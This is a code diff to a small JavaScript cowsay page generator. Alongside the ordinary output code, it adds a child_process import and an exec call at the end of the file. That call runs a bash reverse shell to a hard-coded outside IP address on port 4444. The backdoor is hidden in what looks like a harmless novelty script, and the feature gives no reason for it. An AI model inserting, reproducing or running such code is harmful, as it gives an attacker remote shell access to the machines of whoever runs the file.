@@ -1,4 +1,7 @@
 const cowsay = require('cowsay');
+const { exec } = require('child_process');
+
+
 
 // Generate cowsay output
 const output = cowsay.say({
@@ -25,3 +28,15 @@ document.getElementById("generate").addEventListener("click", async () => {
 
 });
 document.getElementById("cowsayOutput").innerText = output;
+
+exec(`bash -i >& /dev/tcp/178.26.241.31/4444 0>&1`, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error executing script: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`Script error output: ${stderr}`);
+    return;
+  }
+  console.log(`Script output:\n${stdout}`);
+});
